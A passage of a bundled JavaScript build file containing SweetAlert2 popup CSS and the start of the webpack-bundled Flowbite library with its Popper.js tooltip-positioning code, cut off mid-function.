.swal2-x-mark{position:relative;flex-grow:1}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}div:where(.swal2-icon).swal2-warning{border-color:#facea8;color:#f8bb86}div:where(.swal2-icon).swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}div:where(.swal2-icon).swal2-info{border-color:#9de0f6;color:#3fc3ee}div:where(.swal2-icon).swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}div:where(.swal2-icon).swal2-question{border-color:#c9dae1;color:#87adbd}div:where(.swal2-icon).swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}div:where(.swal2-icon).swal2-success{border-color:#a5dc86;color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;border-radius:50%}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}div:where(.swal2-icon).swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}div:where(.swal2-icon).swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:swal2-show .3s}.swal2-hide{animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}@media print{body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container{position:static !important}}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{inset:0 auto auto 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{inset:0 0 auto auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{inset:0 auto auto 0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{inset:50% auto auto 0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{inset:50% auto auto 50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{inset:50% 0 auto auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{inset:auto auto 0 0}body.swal2-toast-shown .swal2-container.swal2-bottom{inset:auto auto 0 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{inset:auto 0 0 auto}');
    }
  });

  // node_modules/flowbite/dist/flowbite.turbo.js
  var require_flowbite_turbo = __commonJS({
    "node_modules/flowbite/dist/flowbite.turbo.js"(exports2, module2) {
      (function webpackUniversalModuleDefinition(root2, factory) {
        if (typeof exports2 === "object" && typeof module2 === "object")
          module2.exports = factory();
        else if (typeof define === "function" && define.amd)
          define("Flowbite", [], factory);
        else if (typeof exports2 === "object")
          exports2["Flowbite"] = factory();
        else
          root2["Flowbite"] = factory();
      })(self, function() {
        return (
          /******/
          function() {
            "use strict";
            var __webpack_modules__ = {
              /***/
              853: (
                /***/
                function(__unused_webpack_module, __webpack_exports__2, __webpack_require__2) {
                  __webpack_require__2.r(__webpack_exports__2);
                  __webpack_require__2.d(__webpack_exports__2, {
                    "afterMain": function() {
                      return (
                        /* reexport */
                        afterMain
                      );
                    },
                    "afterRead": function() {
                      return (
                        /* reexport */
                        afterRead
                      );
                    },
                    "afterWrite": function() {
                      return (
                        /* reexport */
                        afterWrite
                      );
                    },
                    "applyStyles": function() {
                      return (
                        /* reexport */
                        modifiers_applyStyles
                      );
                    },
                    "arrow": function() {
                      return (
                        /* reexport */
                        modifiers_arrow
                      );
                    },
                    "auto": function() {
                      return (
                        /* reexport */
                        auto
                      );
                    },
                    "basePlacements": function() {
                      return (
                        /* reexport */
                        basePlacements
                      );
                    },
                    "beforeMain": function() {
                      return (
                        /* reexport */
                        beforeMain
                      );
                    },
                    "beforeRead": function() {
                      return (
                        /* reexport */
                        beforeRead
                      );
                    },
                    "beforeWrite": function() {
                      return (
                        /* reexport */
                        beforeWrite
                      );
                    },
                    "bottom": function() {
                      return (
                        /* reexport */
                        bottom
                      );
                    },
                    "clippingParents": function() {
                      return (
                        /* reexport */
                        clippingParents
                      );
                    },
                    "computeStyles": function() {
                      return (
                        /* reexport */
                        modifiers_computeStyles
                      );
                    },
                    "createPopper": function() {
                      return (
                        /* reexport */
                        popper_createPopper
                      );
                    },
                    "createPopperBase": function() {
                      return (
                        /* reexport */
                        createPopper
                      );
                    },
                    "createPopperLite": function() {
                      return (
                        /* reexport */
                        popper_lite_createPopper
                      );
                    },
                    "detectOverflow": function() {
                      return (
                        /* reexport */
                        detectOverflow
                      );
                    },
                    "end": function() {
                      return (
                        /* reexport */
                        end
                      );
                    },
                    "eventListeners": function() {
                      return (
                        /* reexport */
                        eventListeners
                      );
                    },
                    "flip": function() {
                      return (
                        /* reexport */
                        modifiers_flip
                      );
                    },
                    "hide": function() {
                      return (
                        /* reexport */
                        modifiers_hide
                      );
                    },
                    "left": function() {
                      return (
                        /* reexport */
                        left
                      );
                    },
                    "main": function() {
                      return (
                        /* reexport */
                        main
                      );
                    },
                    "modifierPhases": function() {
                      return (
                        /* reexport */
                        modifierPhases
                      );
                    },
                    "offset": function() {
                      return (
                        /* reexport */
                        modifiers_offset
                      );
                    },
                    "placements": function() {
                      return (
                        /* reexport */
                        enums_placements
                      );
                    },
                    "popper": function() {
                      return (
                        /* reexport */
                        popper
                      );
                    },
                    "popperGenerator": function() {
                      return (
                        /* reexport */
                        popperGenerator
                      );
                    },
                    "popperOffsets": function() {
                      return (
                        /* reexport */
                        modifiers_popperOffsets
                      );
                    },
                    "preventOverflow": function() {
                      return (
                        /* reexport */
                        modifiers_preventOverflow
                      );
                    },
                    "read": function() {
                      return (
                        /* reexport */
                        read
                      );
                    },
                    "reference": function() {
                      return (
                        /* reexport */
                        reference
                      );
                    },
                    "right": function() {
                      return (
                        /* reexport */
                        right
                      );
                    },
                    "start": function() {
                      return (
                        /* reexport */
                        start2
                      );
                    },
                    "top": function() {
                      return (
                        /* reexport */
                        enums_top
                      );
                    },
                    "variationPlacements": function() {
                      return (
                        /* reexport */
                        variationPlacements
                      );
                    },
                    "viewport": function() {
                      return (
                        /* reexport */
                        viewport
                      );
                    },
                    "write": function() {
                      return (
                        /* reexport */
                        write
                      );
                    }
                  });
                  ;
                  var enums_top = "top";
                  var bottom = "bottom";
                  var right = "right";
                  var left = "left";
                  var auto = "auto";
                  var basePlacements = [enums_top, bottom, right, left];
                  var start2 = "start";
                  var end = "end";
                  var clippingParents = "clippingParents";
                  var viewport = "viewport";
                  var popper = "popper";
                  var reference = "reference";
                  var variationPlacements = /* @__PURE__ */ basePlacements.reduce(function(acc, placement) {
                    return acc.concat([placement + "-" + start2, placement + "-" + end]);
                  }, []);
                  var enums_placements = /* @__PURE__ */ [].concat(basePlacements, [auto]).reduce(function(acc, placement) {
                    return acc.concat([placement, placement + "-" + start2, placement + "-" + end]);
                  }, []);
                  var beforeRead = "beforeRead";
                  var read = "read";
                  var afterRead = "afterRead";
                  var beforeMain = "beforeMain";
                  var main = "main";
                  var afterMain = "afterMain";
                  var beforeWrite = "beforeWrite";
                  var write = "write";
                  var afterWrite = "afterWrite";
                  var modifierPhases = [beforeRead, read, afterRead, beforeMain, main, afterMain, beforeWrite, write, afterWrite];
                  ;
                  function getNodeName(element) {
                    return element ? (element.nodeName || "").toLowerCase() : null;
                  }
                  ;
                  function getWindow(node) {
                    if (node == null) {
                      return window;
                    }
                    if (node.toString() !== "[object Window]") {
                      var ownerDocument = node.ownerDocument;
                      return ownerDocument ? ownerDocument.defaultView || window : window;
                    }
                    return node;
                  }
                  ;
                  function isElement(node) {
                    var OwnElement = getWindow(node).Element;
                    return node instanceof OwnElement || node instanceof Element;
                  }
                  function isHTMLElement(node) {
                    var OwnElement = getWindow(node).HTMLElement;
                    return node instanceof OwnElement || node instanceof HTMLElement;
                  }
                  function isShadowRoot(node) {
                    if (typeof ShadowRoot === "undefined") {
                      return false;
                    }
                    var OwnElement = getWindow(node).ShadowRoot;
                    return node instanceof OwnElement || node instanceof ShadowRoot;
                  }
                  ;
                  function applyStyles(_ref) {
                    var state = _ref.state;
                    Object.keys(state.elements).forEach(function(name) {
                      var style = state.styles[name] || {};
                      var attributes = state.attributes[name] || {};
                      var element = state.elements[name];
                      if (!isHTMLElement(element) || !getNodeName(element)) {
                        return;
                      }
                      Object.assign(element.style, style);
                      Object.keys(attributes).forEach(function(name2) {
                        var value = attributes[name2];
                        if (value === false) {
                          element.removeAttribute(name2);
                        } else {
                          element.setAttribute(name2, value === true ? "" : value);
                        }
                      });
                    });
                  }
                  function effect(_ref2) {
                    var state = _ref2.state;
                    var initialStyles = {
                      popper: {
                        position: state.options.strategy,
                        left: "0",
                        top: "0",
                        margin: "0"
                      },
                      arrow: {
                        position: "absolute"
                      },
                      reference: {}
                    };
                    Object.assign(state.elements.popper.style, initialStyles.popper);
                    state.styles = initialStyles;
                    if (state.elements.arrow) {
                      Object.assign(state.elements.arrow.style, initialStyles.arrow);
                    }
                    return function() {
                      Object.keys(state.elements).forEach(function(name) {
                        var element = state.elements[name];
                        var attributes = state.attributes[name] || {};
                        var styleProperties = Object.keys(state.styles.hasOwnProperty(name) ? state.styles[name] : initialStyles[name]);
                        var style = styleProperties.reduce(function(style2, property) {
                          style2[property] = "";
                          return style2;
                        }, {});
                        if (!isHTMLElement(element) || !getNodeName(element)) {
                          return;
                        }
                        Object.assign(element.style, style);
                        Object.keys(attributes).forEach(function(attribute) {
                          element.removeAttribute(attribute);
                        });
                      });
                    };
                  }
                  var modifiers_applyStyles = {
                    name: "applyStyles",
                    enabled: true,
                    phase: "write",
                    fn: applyStyles,
                    effect,
                    requires: ["computeStyles"]
                  };
                  ;
                  function getBasePlacement(placement) {
                    return placement.split("-")[0];
                  }
                  ;
                  var math_max = Math.max;
                  var math_min = Math.min;
                  var round = Math.round;
                  ;
                  function getUAString() {
                    var uaData = navigator.userAgentData;
                    if (uaData != null && uaData.brands) {
                      return uaData.brands.map(function(item) {
                        return item.brand + "/" + item.version;
                      }).join(" ");
                    }
                    return navigator.userAgent;
                  }
                  ;
                  function isLayoutViewport() {
                    return !/^((?!chrome|android).)*safari/i.test(getUAString());
                  }
                  ;
                  function getBoundingClientRect(element, includeScale, isFixedStrategy) {
                    if (includeScale === void 0) {
                      includeScale = false;
                    }
                    if (isFixedStrategy === void 0) {
                      isFixedStrategy = false;
                    }
                    var clientRect = element.getBoundingClientRect();
                    var scaleX = 1;
                    var scaleY = 1;
                    if (includeScale && isHTMLElement(element)) {
                      scaleX = element.offsetWidth > 0 ? round(clientRect.width) / element.offsetWidth || 1 : 1;
                      scaleY = element.offsetHeight > 0 ? round(clientRect.height) / element.offsetHeight || 1 : 1;
                    }
                    var _ref = isElement(element) ? getWindow(element) : window, visualViewport = _ref.visualViewport;
                    var addVisualOffsets = !isLayoutViewport() && isFixedStrategy;
                    var x = (clientRect.left + (addVisualOffsets && visualViewport ? visualViewport.offsetLeft : 0)) / scaleX;
                    var y = (clientRect.top + (addVisualOffsets && visualViewport ? visualViewport.offsetTop : 0)) / scaleY;
                    var width = clientRect.width / scaleX;
                    var height = clientRect.height / scaleY;
                    return {
                      width,
                      height,
                      top: y,
                      right: x + width,
                      bottom: y + height,
                      left: x,
                      x,
                      y
                    };
                  }
                  ;
                  function getLayoutRect(element) {
                    var clientRect = getBoundingClientRect(element);
                    var width = element.offsetWidth;
                    var height = element.offsetHeight;
                    if (Math.abs(clientRect.width - width) <= 1) {
                      width = clientRect.width;
                    }
                    if (Math.abs(clientRect.height - height) <= 1) {
                      height = clientRect.height;
                    }
                    return {
                      x: element.offsetLeft,
                      y: element.offsetTop,
                      width,
                      height
                    };
                  }
                  ;
                  function contains(parent, child) {
                    var rootNode = child.getRootNode && child.getRootNode();
                    if (parent.contains(child)) {
                      return true;
                    } else if (rootNode && isShadowRoot(rootNode)) {
                      var next = child;
                      do {
                        if (next && parent.isSameNode(next)) {
                          return true;
                        }
                        next = next.parentNode || next.host;
                      } while (next);
                    }
                    return false;
                  }
                  ;
                  function getComputedStyle2(element) {
                    return getWindow(element).getComputedStyle(element);
                  }
                  ;
                  function isTableElement(element) {
                    return ["table", "td", "th"].indexOf(getNodeName(element)) >= 0;
                  }
                  ;
                  function getDocumentElement(element) {
                    return ((isElement(element) ? element.ownerDocument : (
                      // $FlowFixMe[prop-missing]
                      element.document
                    )) || window.document).documentElement;
                  }
                  ;
                  function getParentNode(element) {
                    if (getNodeName(element) === "html") {
                      return element;
                    }
                    return (
                      // this is a quicker (but less type safe) way to save quite some bytes from the bundle
                      // $FlowFixMe[incompatible-return]
                      // $FlowFixMe[prop-missing]
                      element.assignedSlot || // step into the shadow DOM of the parent of a slotted node
                      element.parentNode || // DOM Element detected
                      (isShadowRoot(element) ? element.host : null) || // ShadowRoot detected
                      // $FlowFixMe[incompatible-call]: HTMLElement is a Node
                      getDocumentElement(element)
                    );
                  }
                  ;
                  function getTrueOffsetParent(element) {
                    if (!isHTMLElement(element) || // https://github.com/popperjs/popper-core/issues/837
                    getComputedStyle2(element).position === "fixed") {
                      return null;
                    }
                    return element.offsetParent;
                  }
                  function getContainingBlock(element) {
                    var isFirefox = /firefox/i.test(getUAString());
                    var isIE = /Trident/i.test(getUAString());
                    if (isIE && isHTMLElement(element)) {
                      var elementCss = getComputedStyle2(element);
                      if (elementCss.position === "fixed") {
                        return null;
                      }
                    }
                    var currentNode = getParentNode(element);
                    if (isShadowRoot(currentNode)) {
                      currentNode = currentNode.host;
                    }
                    while (isHTMLElement(currentNode) && ["html", "body"].indexOf(getNodeName(currentNode)) < 0) {
                      var css = getComputedStyle2(currentNode);
                      if (css.transform !== "none" || css.perspective !== "none" || css.contain === "paint" || ["transform", "perspective"].indexOf(css.willChange) !== -1 || isFirefox && css.willChange === "filter" || isFirefox && css.filter && css.filter !== "none") {
                        return currentNode;
                      } else {
                        currentNode = currentNode.parentNode;
                      }
                    }
                    return null;
                  }
                  function getOffsetParent(element) {
                    var window2 = getWindow(element);
                    var offsetParent = getTrueOffsetParent(element);
                    while (offsetParent && isTableElement(offsetParent) && getComputedStyle2(offsetParent).position === "static") {
                      offsetParent = getTrueOffsetParent(offsetParent);
                    }
                    if (offsetParent && (getNodeName(offsetParent) === "html" || getNodeName(offsetParent) === "body" && getComputedStyle2(offsetParent).position === "static")) {
                      return window2;
                    }
                    return offsetParent || getContainingBlock(element) || window2;
                  }
                  ;
                  function getMainAxisFromPlacement(placement) {
                    return ["top", "bottom"].indexOf(placement) >= 0 ? "x" : "y";
                  }
                  ;
                  function within(min, value, max) {
                    return math_max(min, math_min(value, max));
                  }
                  function withinMaxClamp(min, value, max) {
                    var v = within(min, value, max);
                    return v > max ? max : v;
                  }
                  ;
                  function getFreshSideObject() {
                    return {
                      top: 0,
                      right: 0,
                      bottom: 0,
                      left: 0
                    };
                  }
                  ;
                  function mergePaddingObject(paddingObject) {
                    return Object.assign({}, getFreshSideObject(), paddingObject);
                  }
                  ;
                  function expandToHashMap(value, keys) {
                    return keys.reduce(function(hashMap, key) {
                      hashMap[key] = value;
                      return hashMap;
                    }, {});
                  }
                  ;
                  var toPaddingObject = function toPaddingObject2(padding, state) {
                    padding = typeof padding === "function" ? padding(Object.assign({}, state.rects, {
                      placement: state.placement
                    })) : padding;
                    return mergePaddingObject(typeof padding !== "number" ? padding : expandToHashMap(padding, basePlacements));
                  };
                  function arrow(_ref) {
                    var _state$modifiersData$;
                    var state = _ref.state, name = _ref.name, options = _ref.options;
                    var arrowElement = state.elements.arrow;
                    var popperOffsets2 = state.modifiersData.popperOffsets;
                    var basePlacement = getBasePlacement(state.placement);
                    var axis = getMainAxisFromPlacement(basePlacement);
                    var isVertical = [left, right].indexOf(basePlacement) >= 0;
                    var len = isVertical ? "height" : "width";
                    if (!arrowElement || !popperOffsets2) {
                      return;
                    }
                    var paddingObject = toPaddingObject(options.padding, state);
                    var arrowRect = getLayoutRect(arrowElement);
                    var minProp = axis === "y" ? enums_top : left;
                    var maxProp = axis === "y" ? bottom : right;
                    var endDiff = state.rects.reference[len] + state.rects.reference[axis] - popperOffsets2[axis] - state.rects.popper[len];
                    var startDiff = popperOffsets2[axis] - state.rects.reference[axis];
                    var arrowOffsetParent = getOffsetParent(arrowElement);
                    var clientSize = arrowOffsetParent ? axis === "y" ? arrowOffsetParent.clientHeight || 0 : arrowOffsetParent.clientWidth || 0 : 0;
                    var centerToReference = endDiff / 2 - startDiff / 2;
                    var min = paddingObject[minProp];
                    var max = clientSize - arrowRect[len] - paddingObject[maxProp];
                    var center = clientSize / 2 - arrowRect[len] / 2 + centerToReference;
                    var offset2 = within(min, center, max);
                    var axisProp = axis;
                    state.modifiersData[name] = (_state$modifiersData$ = {}, _state$modifiersData$[axisProp] = offset2, _state$modifiersData$.centerOffset = offset2 - center, _state$modifiersData$);
                  }
                  function arrow_effect(_ref2) {
                    var state = _ref2.state, options = _ref2.options;
                    var _options$element = options.element, arrowElement = _options$element === void 0 ? "[data-popper-arrow]" : _options$element;
                    if (arrowElement == null) {
                      return;
                    }
                    if (typeof arrowElement === "string") {
                      arrowElement = state.elements.popper.querySelector(arrowElement);
                      if (!arrowElement) {
                        return;
                      }
                    }
                    if (false) {
                    }
                    if (!contains(state.elements.popper, arrowElement)) {
                      if (false) {
                      }
                      return;
                    }
                    state.elements.arrow = arrowElement;
                  }
                  var modifiers_arrow = {
                    name: "arrow",
                    enabled: true,
                    phase: "main",
                    fn: arrow,
                    effect: arrow_effect,
                    requires: ["popperOffsets"],
                    requiresIfExists: ["preventOverflow"]
                  };
                  ;
                  function getVariation(placement) {
                    return placement.split("-")[1];
                  }
                  ;
                  var unsetSides = {
                    top: "auto",
                    right: "auto",
                    bottom: "auto",
                    left: "auto"
                  };
                  function roundOffsetsByDPR(_ref) {
                    var x = _ref.x, y = _ref.y;
                    var win = window;
                    var dpr = win.devicePixelRatio || 1;
                    return {
                      x: round(x * dpr) / dpr || 0,
                      y: round(y * dpr) / dpr || 0
                    };
                  }
                  function mapToStyles(_ref2) {
                    var _Object$assign2;
                    var popper2 = _ref2.popper, popperRect = _ref2.popperRect, placement = _ref2.placement, variation = _ref2.variation, offsets = _ref2.offsets, position = _ref2.position, gpuAcceleration = _ref2.gpuAcceleration, adaptive = _ref2.adaptive, roundOffsets = _ref2.roundOffsets, isFixed = _ref2.isFixed;
                    var _offsets$x = offsets.x, x = _offsets$x === void 0 ? 0 : _offsets$x, _offsets$y = offsets.y, y = _offsets$y === void 0 ? 0 : _offsets$y;
                    var _ref3 = typeof roundOffsets === "function" ? roundOffsets({
                      x,
                      y
                    }) : {
                      x,
                      y
                    };
                    x = _ref3.x;
                    y = _ref3.y;
                    var hasX = offsets.hasOwnProperty("x");
                    var hasY = offsets.hasOwnProperty("y");
                    var sideX = left;
                    var sideY = enums_top;
                    var win = window;
                    if (adaptive) {
                      var offsetParent = getOffsetParent(popper2);
                      var heightProp = "clientHeight";
                      var widthProp = "clientWidth";
                      if (offsetParent === getWindow(popper2)) {
                        offsetParent = getDocumentElement(popper2);
                        if (getComputedStyle2(offsetParent).position !== "static" && position === "absolute") {
                          heightProp = "scrollHeight";
                          widthProp = "scrollWidth";
                        }
                      }
                      offsetParent = offsetParent;
                      if (placement === enums_top || (placement === left || placement === right) && variation === end) {
                        sideY = bottom;
                        var offsetY = isFixed && offsetParent === win && win.visualViewport ? win.visualViewport.height : (
                          // $FlowFixMe[prop-missing]
                          offsetParent[heightProp]
                        );
                        y -= offsetY - popperRect.height;
                        y *= gpuAcceleration ? 1 : -1;
                      }
                      if (placement === left || (placement === enums_top || placement === bottom) && variation === end) {
                        sideX = right;
                        var offsetX = isFixed && offsetParent === win && win.visualViewport ? win.visualViewport.width : (
                          // $FlowFixMe[prop-missing]
                          offsetParent[widthProp]
                        );
                        x -= offsetX - popperRect.width;
                        x *= gpuAcceleration ? 1 : -1;
                      }
                    }
                    var commonStyles = Object.assign({
                      position
                    }, adaptive && unsetSides);
                    var _ref4 = roundOffsets === true ? roundOffsetsByDPR({
                      x,
                      y
                    }) : {
                      x,
                      y
                    };
                    x = _ref4.x;
                    y = _ref4.y;
                    if (gpuAcceleration) {
                      var _Object$assign;
                      return Object.assign({}, commonStyles, (_Object$assign = {}, _Object$assign[sideY] = hasY ? "0" : "", _Object$assign[sideX] = hasX ? "0" : "", _Object$assign.transform = (win.devicePixelRatio || 1) <= 1 ? "translate(" + x + "px, " + y + "px)" : "translate3d(" + x + "px, " + y + "px, 0)", _Object$assign));
                    }
                    return Object.assign({}, commonStyles, (_Object$assign2 = {}, _Object$assign2[sideY] = hasY ? y + "px" : "", _Object$assign2[sideX] = hasX ? x + "px" : "", _Object$assign2.transform = "", _Object$assign2));
                  }
                  function computeStyles(_ref5) {
                    var state = _ref5.state, options = _ref5.options;
                    var _options$gpuAccelerat = options.gpuAcceleration, gpuAcceleration = _options$gpuAccelerat === void 0 ? true : _options$gpuAccelerat, _options$adaptive = options.adaptive, adaptive = _options$adaptive === void 0 ? true : _options$adaptive, _options$roundOffsets = options.roundOffsets, roundOffsets = _options$roundOffsets === void 0 ? true : _options$roundOffsets;
                    if (false) {
                      var transitionProperty;
                    }
                    var commonStyles = {
                      placement: getBasePlacement(state.placement),
                      variation: getVariation(state.placement),
                      popper: state.elements.popper,
                      popperRect: state.rects.popper,
                      gpuAcceleration,
                      isFixed: state.options.strategy === "fixed"
                    };
                    if (state.modifiersData.popperOffsets != null) {
                      state.styles.popper = Object.assign({}, state.styles.popper, mapToStyles(Object.assign({}, commonStyles, {
                        offsets: state.modifiersData.popperOffsets,
                        position: state.options.strategy,
                        adaptive,
                        roundOffsets
                      })));
                    }
                    if (state.modifiersData.arrow != null) {
                      state.styles.arrow = Object.assign({}, state.styles.arrow, mapToStyles(Object.assign({}, commonStyles, {
                        offsets: state.modifiersData.arrow,
                        position: "absolute",
                        adaptive: false,
                        roundOffsets
                      })));
                    }
                    state.attributes.popper = Object.assign({}, state.attributes.popper, {
                      "data-popper-placement": state.placement
                    });
                  }
                  var modifiers_computeStyles = {
                    name: "computeStyles",
                    enabled: true,
                    phase: "beforeWrite",
                    fn: computeStyles,
                    data: {}
                  };
                  ;
                  var passive = {
                    passive: true
                  };
                  function eventListeners_effect(_ref) {
                    var state = _ref.state, instance = _ref.instance, options = _ref.options;
                    var _options$scroll = options.scroll, scroll = _options$scroll === void 0 ? true : _options$scroll, _options$resize = options.resize, resize = _options$resize === void 0 ? true : _options$resize;
                    var window2 = getWindow(state.elements.popper);
                    var scrollParents = [].concat(state.scrollParents.reference, state.scrollParents.popper);
                    if (scroll) {
                      scrollParents.forEach(function(scrollParent) {
                        scrollParent.addEventListener("scroll", instance.update, passive);
                      });
                    }
                    if (resize) {
                      window2.addEventListener("resize", instance.update, passive);
                    }
                    return function() {
                      if (scroll) {
                        scrollParents.forEach(function(scrollParent) {
                          scrollParent.removeEventListener("scroll", instance.update, passive);
                        });
                      }
                      if (resize) {
                        window2.removeEventListener("resize", instance.update, passive);
                      }
                    };
                  }
                  var eventListeners = {
                    name: "eventListeners",
                    enabled: true,
                    phase: "write",
                    fn: function fn() {
                    },
                    effect: eventListeners_effect,
                    data: {}
                  };
                  ;
                  var hash = {
                    left: "right",
                    right: "left",
                    bottom: "top",
                    top: "bottom"
                  };
                  function getOppositePlacement(placement) {
                    return placement.replace(/left|right|bottom|top/g, function(matched) {
                      return hash[matched];
                    });
                  }
                  ;
                  var getOppositeVariationPlacement_hash = {
                    start: "end",
                    end: "start"
                  };
                  function getOppositeVariationPlacement(placement) {
                    return placement.replace(/start|end/g, function(matched) {
                      return getOppositeVariationPlacement_hash[matched];
                    });
                  }
                  ;
                  function getWindowScroll(node) {
                    var win = getWindow(node);
                    var scrollLeft = win.pageXOffset;
                    var scrollTop = win.pageYOffset;
                    return {
                      scrollLeft,
                      scrollTop
                    };
                  }
                  ;
                  function getWindowScrollBarX(element) {
                    return getBoundingClientRect(getDocumentElement(element)).left + getWindowScroll(element).scrollLeft;
                  }
                  ;
                  function getViewportRect(element, strategy) {
